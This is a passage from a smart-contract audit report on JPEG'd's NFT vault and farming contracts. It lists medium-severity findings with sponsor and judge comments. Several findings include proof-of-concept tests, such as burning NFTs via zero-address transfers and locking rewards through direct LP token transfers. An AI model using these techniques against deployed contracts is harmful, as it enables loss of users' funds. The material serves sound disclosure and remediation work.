amount of the staked token from being mixed up with the reward token.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/1)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/1#issuecomment-1099231224):**\n > Fixed in [jpegd/core#2](https://github.com/jpegd/core/pull/2).\n\n\n\n***\n\n## [[M-02] NFTHelper Contract Allows Owner to Burn NFTs](https://github.com/code-423n4/2022-04-jpegd-findings/issues/47)\n_Submitted by Kenshin_\n\n[CryptoPunksHelper.sol#L38](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L38)<br>\n[CryptoPunksHelper.sol#L52](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L52)<br>\n\nIn the NFT helper contract, there is no validation on that the receiver address must not be address zero. Therefore, it allows owner or an attacker who gain access to the owner address to burn NFTs forever through the functions by transferring the NFTs to address zero.\n\n### Proof of Concept\n\nThe PoC is originally conducted using foundry. However, it isn't that complicated so I rewrote it in TypeScipt as well, the team can easily proof this by including in the `CryptoPunksHelper.ts`.\n\n#### TypeScript\n\n    // add `.only` to run only this test, not all.\n    it.only(\"allows the owner to burn nfts\", async () => {\n        // safeTransferFrom\n        await cryptoPunks.getPunk(1);\n        await cryptoPunks.transferPunk(helper.address, 1);\n        await helper.safeTransferFrom(owner.address, ZERO_ADDRESS, 1);\n        expect(await cryptoPunks.punkIndexToAddress(1)).to.equal(ZERO_ADDRESS);\n        expect(await helper.ownerOf(1)).to.equal(ZERO_ADDRESS);\n\n        // transferFrom\n        await cryptoPunks.getPunk(2);\n        await cryptoPunks.transferPunk(helper.address, 2);\n        await helper.transferFrom(owner.address, ZERO_ADDRESS, 2);\n        expect(await cryptoPunks.punkIndexToAddress(2)).to.equal(ZERO_ADDRESS);\n        expect(await helper.ownerOf(2)).to.equal(ZERO_ADDRESS);\n      });\n\n#### Foundry\n\n    pragma solidity ^0.8.0;\n\n    // for test\n    import \"ds-test/test.sol\";\n    import \"forge-std/Vm.sol\";\n\n    // contracts\n    import \"../test/CryptoPunks.sol\";\n    import \"../helpers/CryptoPunksHelper.sol\";\n\n    contract CryptoPunksHelperTest is DSTest {\n        Vm constant vm = Vm(HEVM_ADDRESS);\n        \n        address owner = address(1);\n        address user = address(2);\n        \n        CryptoPunks private cps;\n        CryptoPunksHelper private helper;\n\n        function setUp() public {\n            vm.startPrank(owner);\n            cps = new CryptoPunks();\n            helper = new CryptoPunksHelper();\n            helper.initialize(address(cps));\n            vm.stopPrank();\n        }\n\n        function testOwnerTransferToZero() public {\n            //make sure address zero hold no punks\n            assertEq(cps.balanceOf(address(0)), 0);\n\n            // safeTransferFrom PoC\n            vm.startPrank(owner);\n            cps.getPunk(1);\n            cps.transferPunk(address(helper), 1);\n            helper.safeTransferFrom(owner, address(0), 1);\n            assertEq(cps.punkIndexToAddress(1), address(0));\n            assertEq(helper.ownerOf(1), address(0));\n            assertEq(cps.balanceOf(address(0)), 1);\n\n            // transferFrom PoC\n            cps.getPunk(2);\n            cps.transferPunk(address(helper), 2);\n            helper.transferFrom(owner, address(0), 2);\n            assertEq(cps.punkIndexToAddress(2), address(0));\n            assertEq(helper.ownerOf(2), address(0));\n            assertEq(cps.balanceOf(address(0)), 2);\n        }\n    }\n\nfoundry.toml\n\n    [default]\n    src = \"contracts\"\n    libs = [\"lib/forge-std/lib\", \"lib/\", \"node_modules\"]\n    solc_version = \"0.8.0\"\n    optimizer = false\n    fuzz_runs = 100000\n    test = \"foundryTest\"\n\n### Tools Used\n\n*   Foundry\n*   Hardhat\n\n### Recommended Mitigation Steps\n\nEven the functions are restricted for only the owner, the zero address should not be allowed as the receiver address.\n\n**[spaghettieth (JPEG'd) acknowledged and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/47#issuecomment-1095518421):**\n > The sole purpose of `CryptoPunksHelper.sol` and `EtherRocksHelper.sol` contracts is to allow compatibility of non ERC721 NFTs to be compatible with `NFTVault.sol` without having to modify the vault's code. They don't have to provide any additional security check outside of compatibility related ones, everything else is out of scope and should be handled by the underlying NFT.\n\n\n\n***\n\n## [[M-03] reward will be locked in the farm if no LP join the pool at epoch.startBlock ](https://github.com/code-423n4/2022-04-jpegd-findings/issues/14)\n_Submitted by TrungOre_\n\n[LPFarming.sol#L214](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L214)<br>\n[LPFarming.sol#L107](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L107)<br>\n\nA part of reward tokens will be locked in the farming pool if no user deposits lpToken at the epoch.startBlock.\n\n### Proof of Concept\n\n    it(\"a part of reward should be locked in farm if no LP join the pool at epoch.startBlock\", async() => {\n          // manual mine new block  \n          await network.provider.send(\"evm_setAutomine\", [false]);\n\n          // prepare \n          await lpTokens[0].transfer(alice.address, units(1000));\n          await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n          await mineBlocks(1);\n\n          // create new pool\n          await farming.add(10, lpTokens[0].address);\n          await mineBlocks(1);\n          expect(await farming.poolLength()).to.equal(1);\n\n          let pool = await farming.poolInfo(0);\n          expect(pool.lpToken).to.equal(lpTokens[0].address);\n          expect(pool.allocPoint).to.equal(10);\n\n          // create new epoch ==> balance of pool will be 1000 \n          let blockNumber = await ethers.provider.getBlockNumber();\n          await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n          // skip the epoch.startBlock  \n          // it mean no one deposit lpToken to farm at this block \n          await mineBlocks(1);\n          expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n          // alice deposit \n          await farming.connect(alice).deposit(0, units(100));\n          await mineBlocks(1);\n\n          // skip the blocks to the end of epoch \n          await mineBlocks(13);\n\n          await farming.connect(alice).claim(0);\n          await mineBlocks(1);\n\n          console.log(\"reward of alice: \", (await jpeg.balanceOf(alice.address)).toString());\n          console.log(\"reward remain: \", await jpeg.balanceOf(farming.address));\n\n          // 100 jpeg will be locked in the pool forevers \n          expect(await jpeg.balanceOf(alice.address)).to.equal(900);\n          expect(await jpeg.balanceOf(farming.address)).to.equal(100);\n        }); \n\nIn the example above, I create an epoch from blockNumber + 1 to blockNumber + 11 with the reward for each block being 100JPEG. So, the total reward for this farm will be 1000JPEG. When I skip the epoch.startBlock and let Alice deposit 100 lpToken at the block right after, at the end of the farm (epoch.endBlock), the total reward of Alice is just 900JPEG, and 100JPEG still remains in the farming pool. Since there is no function for the admin (or users) to withdraw the remaining, 100JPEG will be stucked in the pool forever !!!\n\n### Tools Used\n\ntypescript\n\n### Recommended Mitigation Steps\n\nAdd a new function for the admin (or user) to claim all rewards which remained in the pool when epoch.endTime has passed\n\n    function claimRemainRewardsForOwner() external onlyOwner {\n            require(\n                block.number > epoch.endBlock, \n                'epoch has not ended'\n            );\n            uint256 remain = jpeg.balanceOf(address(this));\n            jpeg.safeTransfer(msg.sender, remain);\n        }\n\n**[spaghettieth (JPEG'd) acknowledged, but disagreed with Medium severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/14#issuecomment-1095301767):**\n > This is a very minor issue, severity should be 0.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/14#issuecomment-1109977048):**\n > I disagree with the sponsor. Funds are lost in this scenario and it is very easy to mitigate.\n\n\n\n***\n\n## [[M-04] `setDebtInterestApr` should accrue debt first](https://github.com/code-423n4/2022-04-jpegd-findings/issues/78)\n_Submitted by cmichel, also found by pedroais_\n\n[NFTVault.sol#L212](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L212)<br>\n\nThe `setDebtInterestApr` changes the debt interest rate without first accruing the debt.<br>\nThis means that the new debt interest rate is applied retroactively to the unaccrued period on next `accrue()` call.\n\nIt should never be applied retroactively to a previous time window as this is unfair & wrong.<br>\nBorrowers can incur more debt than they should.\n\n### Recommended Mitigation Steps\n\nCall `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/78)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/78#issuecomment-1099241122):**\n > Fixed in [jpegd/core#4](https://github.com/jpegd/core/pull/4).\n\n\n\n***\n\n## [[M-05] Rewards will be locked if user transfer directly to pool without using deposit function ](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19)\n_Submitted by TrungOre_\n\n[LPFarming.sol#L190](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L190)<br>\n\nReward will be locked in the farming, when user execute a direct transfer with lpToken to farm without using deposit.\n\n### Proof of Concept\n\n\"pls add this test to LpFarming.ts to check\"\n\n    it(\"a part of rewards can't be distributed if user execute a direct transfer to farm\", async() => {\n          // manual mine new block  \n          await network.provider.send(\"evm_setAutomine\", [false]);\n\n          // prepare \n          const attacker = bob;\n          await lpTokens[0].transfer(alice.address, units(1000));\n          await lpTokens[0].transfer(attacker.address, units(1000));\n          await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n          await mineBlocks(1);\n\n          // attacker direct deposit lp token to the pool \n          await lpTokens[0].connect(attacker).transfer(farming.address, units(100));\n\n          // create new pool\n          await farming.add(10, lpTokens[0].address);\n          await mineBlocks(1);\n          expect(await farming.poolLength()).to.equal(1);\n\n          let pool = await farming.poolInfo(0);\n          expect(pool.lpToken).to.equal(lpTokens[0].address);\n          expect(pool.allocPoint).to.equal(10);\n\n          // create new epoch ==> balance of pool will be 1000 \n          let blockNumber = await ethers.provider.getBlockNumber();\n          await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n          // alice deposit \n          await farming.connect(alice).deposit(0, units(100));\n          await mineBlocks(1);\n\n          expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n          // when pool end, alice can just take 500 jpeg, and 500 jpeg will be locked in the contract forever !!!\n          await mineBlocks(13);\n          console.log(\"reward of alice: \", (await   farming.pendingReward(0, alice.address)).toString());\n          expect(await farming.pendingReward(0, alice.address)).to.equal(BigNumber.from('500'));\n        });\n\nIn the test above, the attacker transfers 100 lpToken to the farm without using deposit function, and alice deposit 100 lpToken. Because the contract uses `pool.lpToken.balanceOf(address(this))` to get the total supply of lpToken in the pool, it will sum up 100 lpToken of attacker and 100 lpToken of alice. This will lead to the situation where Alice will only be able to claim 500 token (at epoch.endBlock), the rest will be locked in the pool forever. Not only with this pool, it also affects the following, a part of the reward will be locked in the pool when the farm end.\n\n### Tools Used\n\ntypescript\n\n### Recommended Mitigation Steps\n\nDeclare a new variable `totalLPSupply` to the struct `PoolInfo`, and use it instead of `pool.lpToken.balanceOf(address(this))`.\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1095312206):**\n > Very minor issue, severity should be 0.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1099230941):**\n > Fixed in [jpegd/core#2](https://github.com/jpegd/core/pull/2).\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1109827974):**\n > I'm going to downgrade this to a medium. There is a possibility for lost funds given real world external factors (user stupidity).\n\n\n\n***\n\n## [[M-06] Oracle data feed is insufficiently validated.](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54)\n_Submitted by Jujic, also found by hickuphh3_\n\nPrice can be stale and can lead to wrong `answer` return value.\n\n### Proof of Concept\n\nOracle data feed is insufficiently validated. There is no check for stale price and round completeness. Price can be stale and can lead to wrong  `answer`  return value.\n\n```\nfunction _collateralPriceUsd() internal view returns (uint256) {\n        int256 answer = oracle.latestAnswer();\n        uint8 decimals = oracle.decimals();\n\n        require(answer > 0, \"invalid_oracle_answer\");\n\n        ...\n\n```\n\n[FungibleAssetVaultForDAO.sol#L105](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L105)<br>\n\n### Recommended Mitigation Steps\n\nValidate data feed\n\n```\nfunction _collateralPriceUsd() internal view returns (uint256) {\n\n(uint80 roundID, int256 answer, , uint256 timestamp, uint80 answeredInRound) = oracle.latestRoundData();\n   \n    require(answer > 0, \"invalid_oracle_answer\");\n    require(answeredInRound >= roundID, \"ChainLink: Stale price\");\n    require(timestamp > 0, \"ChainLink: Round not complete\");\n\n         ...\n\n```\n\n**[0xJPEG (JPEG'd) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1101687980):**\n > Can add validation for round not being complete yet and potentially for stale pricing.<br>\n> This should be medium risk, as shown in past contests [[1]](https://github.com/code-423n4/code423n4.com/blob/65f9f13b7502c264098fe65ab57e79fcf99e956d/_data/reports/2022-01-notional.md#m-01-usage-of-deprecated-chainlink-api-in-eip1271wallet) [[2]](https://github.com/code-423n4/code423n4.com/blob/61f7d00561352d0c312b7f516404840eb68c824e/_data/reports/2021-12-yetifinance.md#m-02-should-check-return-data-from-chainlink-aggregators) [[3]](https://github.com/code-423n4/code423n4.com/blob/582de04e5765ee1953d0f07968fcd46ee2204ac7/_data/reports/2021-05-fairside.md#m-09-should-check-return-data-from-chainlink-aggregators)\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1102902675):**\n > Fixed in [jpegd/core#9](https://github.com/jpegd/core/pull/9).\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1109875877):**\n > Agree with sponsor on the medium risk rating. An oracle with a bad value is by definition an external requirement.\n\n\n\n***\n\n## [[M-07] Wrong calculation for `yVault` price per share if decimals != 18](https://github.com/code-423n4/2022-04-jpegd-findings/issues/117)\n_Submitted by berndartmueller_\n\nThe [yVault.getPricePerFullShare()](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L196) function calculates the price per share by multiplying with `1e18` token decimals with the assumption that the underlying token always has 18 decimals. `yVault` has the same amount of decimals as it's underlying token see ([yVault.decimals()](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L70))\n\nBut tokens don't always have `1e18` decimals (e.g. USDC).\n\n### Impact\n\nThe price per share calculation does not return the correct price for underlying tokens that do not have 18 decimals. This could lead to paying out too little or too much and therefore to a loss for either the protocol or the user.\n\n### Proof of Concept\n\nFollowing test will fail with the current implementation when the underlying vault token has 6 decimals:\n\n*NOTE: `units()` helper function was adapted to accept the desired decimals.*\n\n```typescript\nit.only(\"should mint the correct amount of tokens for tokens with 6 decimals\", async () => {\n  const DECIMALS = 6;\n\n  await token.setDecimals(DECIMALS);\n  expect(await yVault.decimals()).to.equal(DECIMALS);\n\n  expect(await yVault.getPricePerFullShare()).to.equal(0);\n  await token.mint(user1.address, units(1000, DECIMALS));\n  await token.connect(user1).approve(yVault.address, units(1000, DECIMALS));\n\n  await yVault.connect(user1).deposit(units(500, DECIMALS));\n  expect(await yVault.balanceOf(user1.address)).to.equal(units(500, DECIMALS));\n\n  await token.mint(strategy.address, units(500, DECIMALS));\n  expect(await yVault.getPricePerFullShare()).to.equal(units(2, DECIMALS));\n});\n```\n\nFails with following error: `AssertionError: Expected \"2000000000000000000\" to be equal 2000000`\n\n### Recommended mitigation steps\n\nUse vault `decimals()` instead of hardcoded `1e18` decimals.\n\n```solidity\nfunction getPricePerFullShare() external view returns (uint256) {\n    uint256 supply = totalSupply();\n    if (supply == 0) return 0;\n    return (balance() * (10**decimals())) / supply; // @audit-info use `decimals()` instead of hardcoded `1e18`\n}\n```\n\n**[spaghettieth (JPEG'd) disputed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/117#issuecomment-1097985902):**\n > The `yVault` contract has been designed to work with Curve LPs, which have 18 decimals\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/117#issuecomment-1109895569):**\n > I'm downgrading this to a medium risk but leaving it as valid. Any number of external factors could conspire to result in a non-18 decimal token being used in the future, at which point this code may have been forgotten. A better choice would be to do a decimal check.\n\n\n\n***\n\n## [[M-08] `_swapUniswapV2` may use an improper `path` which can cause a loss of the majority of the rewardTokens](https://github.com/code-423n4/2022-04-jpegd-findings/issues/157)\n_Submitted by WatchPug_\n\n[StrategyPUSDConvex.sol#L311-L334](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L311-L334)<br>\n\n```solidity\nfunction harvest(uint256 minOutCurve) external onlyRole(STRATEGIST_ROLE) {\n    convexConfig.baseRewardPool.getReward(address(this), true);\n\n    //Prevent `Stack too deep` errors\n    {\n        DexConfig memory dex = dexConfig;\n        IERC20[] memory rewardTokens = strategyConfig.rewardTokens;\n        IERC20 _weth = weth;\n        for (uint256 i = 0; i < rewardTokens.length; i++) {\n            uint256 balance = rewardTokens[i].balanceOf(address(this));\n\n            if (balance > 0)\n                //minOut is not needed here, we already have it on the Curve deposit\n                _swapUniswapV2(\n                    dex.uniswapV2,\n                    rewardTokens[i],\n                    _weth,\n                    balance,\n                    0\n                );\n        }\n\n        uint256 wethBalance = _weth.balanceOf(address(this));\n        require(wethBalance > 0, \"NOOP\");\n        ...\n```\n\n[StrategyPUSDConvex.sol#L410-L430](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L410-L430)<br>\n\n```solidity\n function _swapUniswapV2(\n    IUniswapV2Router router,\n    IERC20 tokenIn,\n    IERC20 tokenOut,\n    uint256 amountIn,\n    uint256 minOut\n) internal {\n    tokenIn.safeIncreaseAllowance(address(router), amountIn);\n\n    address[] memory path = new address[](2);\n    path[0] = address(tokenIn);\n    path[1] = address(tokenOut);\n\n    router.swapExactTokensForTokens(\n        amountIn,\n        minOut,\n        path,\n        address(this),\n        block.timestamp\n    );\n}\n```\n\nIn the current implementation, `rewardTokens` from the underlying strategy will be swapped to `weth` first then `weth` -> `usdc`.\n\nHowever, the `path` used for swapping from `rewardToken` -> `weth` is hardcoded as `[rewardToken, weth]`, which may not be the optimal route.\n\nFor example, the majority liquidity for a particular `rewardToken` may actually be in the `rewardToken/USDC` pool. Swapping through the `rewardToken/WETH` with low liquidity may end up getting only a dust amount of WETH.\n\n### Recommended Mitigation Steps\n\nConsider allowing the admin to set a path for the rewardTokens.\n\n**[spaghettieth (JPEG'd) disputed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/157#issuecomment-1098388022):**\n > As of now, the one in the contract is the optimal routing path.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/157#issuecomment-1109923759):**\n > I think the warden has made a reasonable find and recommendation. The sponsor used the phrase 'as of now' in disputing the report, but the idea that it may not always be the optimal path is actually specifically what the report and its mitigation addresses. That said, external factors are required so moving it to medium severity.\n\n\n\n***\n\n## [[M-09] The noContract modifier does not work as expected.](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11)\n_Submitted by Wayne, also found by hyh, PPrieditis, rayn, smiling_heretic, and Cr4ckM3_\n\n[yVault.sol#L61](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/vaults/yVault/yVault.sol#L61)<br>\n[yVaultLPFarming.sol#L54](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/farming/yVaultLPFarming.sol#L54)<br>\n\nThe expectation of the noContract modifier is to allow access only to accounts inside EOA or Whitelist, if access is controlled using ! access control with \\_account.isContract(), then because isContract() gets the size of the code length of the account in question by relying on extcodesize/address.code.length, this means that the restriction can be bypassed when deploying a smart contract through the smart contract's constructor call.\n\n### Recommended Mitigation Steps\n\nModify the code to `require(msg.sender == tx.origin);`\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with Medium severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1095292333):**\n > The observations made in the issue are correct, but given how impractical it would be to make an autocompounder that bypasses the `noContract` modifier this issue should probably be severity 0. It's worth mentioning that this behaviour was already known as outlined in the modifier's documentation.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1099249484):**\n > Fixed in [jpegd/core#17](https://github.com/jpegd/core/pull/17).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1109971129):**\n > I'm going to let this stand. Impractical or not, this is very easily exploited.\n\n\n\n***\n\n## [[M-10] Chainlink pricer is using a deprecated API](https://github.com/code-423n4/2022-04-jpegd-findings/issues/4)\n_Submitted by cccz, also found by 0xDjango, 0xkatana, berndartmueller, Cr4ckM3, defsec, horsefacts, hyh, JMukesh, joshie, Jujic, pedroais, peritoflores, rayn, reassor, Ruhum, and WatchPug_\n\nAccording to Chainlink's documentation, the latestAnswer function is deprecated. This function might suddenly stop working if Chainlink stops supporting deprecated APIs. And the old API can return stale data.\n\n### Proof of Concept\n\n[FungibleAssetVaultForDAO.sol#L105](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L105)<br>\n[NFTVault.sol#L459](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L459)<br>\n\n### Recommended Mitigation Steps\n\nUse the latestRoundData function to get the price instead. Add checks on the return data with proper revert messages if the price is stale or the round is uncomplete.<br>\n<https://docs.chain.link/docs/price-feeds-api-reference/>\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/4)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/4#issuecomment-1099244659):**\n > Fixed in [jpegd/core#9](https://github.com/jpegd/core/pull/9).\n\n\n\n***\n\n## [[M-11] Division before Multiplication May Result In No Interest Being Accrued](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97)\n_Submitted by AuditsAreUS, also found by minhquanym_\n\n[NFTVault.sol#L590-L595](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L590-L595)<br>\n\nThere is a division before multiplication bug in `NFTVault._calculateAdditionalInterest()` which may result in no interesting being accrued and will have significant rounding issues for tokens with small decimal places.\n\nThis issue occurs since an intermediate calculation of  `interestPerSec` may round to zero and therefore the multiplication by `elapsedTime` may remain zero.\n\nFurthermore, even if `interestPerSec > 0` there will still be rounding errors as a result of doing division before multiplication and `_calculatedInterest()` will be understated.\n\nThis issue is significant as one divisor is 365 days = 30,758,400 (excluding the rate). Since many ERC20 tokens such as USDC and USDT only have 6 decimal places a numerator of less 30 \\* 10^6 will round to zero.\n\nThe rate also multiplies into the denominator. e.g. If the rate is 1% then the denominator will be equivalent to `1 / rate * 30 * 10^6 = 3,000 * 10^6`.\n\n### Proof of Concept\n\nThe order of operations for the interest calculations\n\n*   `totalDebtAmount`\n*   MUL `settings.debtInterestApr.numerator`\n*   DIV `settings.debtInterestApr.denominator`\n*   DIV `365 days`\n*   MUL `elapsedTime`\n\nIf the intermediate value of `interestPerSec = 0` then the multiplication by `elapsedTime` will still be zero and no interested will be accrued.\n\nExcerpt from `NFTVault._calculateAdditionalInterest()`.\n\n            uint256 interestPerYear = (totalDebtAmount *\n                settings.debtInterestApr.numerator) /\n                settings.debtInterestApr.denominator;\n            uint256 interestPerSec = interestPerYear / 365 days;\n\n            return elapsedTime * interestPerSec;\n\n### Recommended Mitigation Steps\n\nThis issue may be resolved by performing the multiplication by `elapsedTime` before the division by the denominator or `365 days`.\n\n            uint256 interestAccrued = (elapsedTime * \n                totalDebtAmount *\n                settings.debtInterestApr.numerator) /\n                settings.debtInterestApr.denominator /\n                365 days;\n\n            return  interestAccrued;\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97):**\n > Fixed [jpegd/core#8](https://github.com/jpegd/core/pull/8). \n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97#issuecomment-1110008295):**\n > This report makes sense as a medium to me because it involves a calculation error that can lead to the protocol functioning incorrectly.\n\n\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 42 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-04-jpegd-findings/issues/225) by **Dravee** received the top score from the judge.\n\n*The following wardens also submitted reports: [IllIllI](https://github.com/code-423n4/2022-04-jpegd-findings/issues/204), [0xDjango](https://github.com/code-423n4/2022-04-jpegd-findings/issues/215), [robee](https://github.com/code-423n4/2022-04-jpegd-findings/issues/69), [PPrieditis](https://github.com/code-423n4/2022-04-jpegd-findings/issues/84), [Kthere](https://github.com/code-423n4/2022-04-jpegd-findings/issues/71), [hickuphh3](https://github.com/code-423n4/2022-04-jpegd-findings/issues/62), [0xkatana](https://github.com/code-423n4/2022-04-jpegd-findings/issues/196), [WatchPug](https://github.com/code-423n4/2022-04-jpegd-findings/issues/171), [horsefacts](https://github.com/code-423n4/2022-04-jpegd-findings/issues/232), [ilan](https://github.com/code-423n4/2022-04-jpegd-findings/issues/212), [Ruhum](https://github.com/code-423n4/2022-04-jpegd-findings/issues/179), [berndartmueller](https://github.com/code-423n4/2022-04-jpegd-findings/issues/112), [hubble](https://github.com/code-423n4/2022-04-jpegd-findings/issues/178), [hyh](https://github.com/code-423n4/2022-04-jpegd-findings/issues/222), [kebabsec](https://github.com/code-423n4/2022-04-jpegd-findings/issues/189), [kenta](https://github.com/code-423n4/2022-04-jpegd-findings/issues/224), [Hawkeye](https://github.com/code-423n4/2022-04-jpegd-findings/issues/192), [TerrierLover](https://github.com/code-423n4/2022-04-jpegd-findings/issues/46), [rfa](https://github.com/code-423n4/2022-04-jpegd-findings/issues/217), [catchup](https://github.com/code-423n4/2022-04-jpegd-findings/issues/120), [rayn](https://github.com/code-423n4/2022-04-jpegd-findings/issues/140), [Foundation](https://github.com/code-423n4/2022-04-jpegd-findings/issues/144), [Funen](https://github.com/code-423n4/2022-04-jpegd-findings/issues/148), [Picodes](https://github.com/code-423n4/2022-04-jpegd-findings/issues/150), [TrungOre](https://github.com/code-423n4/2022-04-jpegd-findings/issues/21), [delfin454000](https://github.com/code-423n4/2022-04-jpegd-findings/issues/177), [ellahi](https://github.com/code-423n4/2022-04-jpegd-findings/issues/183), [JMukesh](https://github.com/code-423n4/2022-04-jpegd-findings/issues/126), [0x1f8b](https://github.com/code-423n4/2022-04-jpegd-findings/issues/90), [Cityscape](https://github.com/code-423n4/2022-04-jpegd-findings/issues/154), [Jujic](https://github.com/code-423n4/2022-04-jpegd-findings/issues/55), [JC](https://github.com/code-423n4/2022-04-jpegd-findings/issues/202), [dy](https://github.com/code-423n4/2022-04-jpegd-findings/issues/188), [AuditsAreUS](https://github.com/code-423n4/2022-04-jpegd-findings/issues/98), [pauliax](https://github.com/code-423n4/2022-04-jpegd-findings/issues/184), [cccz](https://github.com/code-423n4/2022-04-jpegd-findings/issues/53), [cmichel](https://github.com/code-423n4/2022-04-jpegd-findings/issues/79), [reassor](https://github.com/code-423n4/2022-04-jpegd-findings/issues/94), [minhquanym](https://github.com/code-423n4/2022-04-jpegd-findings/issues/39), [samruna](https://github.com/code-423n4/2022-04-jpegd-findings/issues/22), and [jayjonah8](https://github.com/code-423n4/2022-04-jpegd-findings/issues/6).*\n\n## Codebase Impressions & Summary\n\nOverall, the code quality is high.\n\nThe findings here revolve around some commonly suggested practices.\n\n## \\[L-01] Add constructor initializers\n\nAs per [OpenZeppelin’s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), “The guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.”\n\nNote that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.”\n\nFurthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:\n\n```solidity\ncontracts/helpers/CryptoPunksHelper.sol:\n  19:     function initialize(address punksAddress) external initializer {\n\ncontracts/helpers/EtherRocksHelper.sol:\n  19:     function initialize(address rocksAddress) external initializer {\n\ncontracts/staking/JPEGStaking.sol:\n  21:     function initialize(IERC20Upgradeable _jpeg) external initializer {\n\ncontracts/vaults/FungibleAssetVaultForDAO.sol:\n  66:     function initialize(\n\ncontracts/vaults/NFTVault.sol:\n  139:     function initialize(\n```\n\n## \\[L-02] Immutable addresses should be 0-checked\n\nConsider adding an `address(0)` check here (see `@audit`):\n\n```solidity\ncontracts/farming/LPFarming.sol:\n  77:         jpeg = 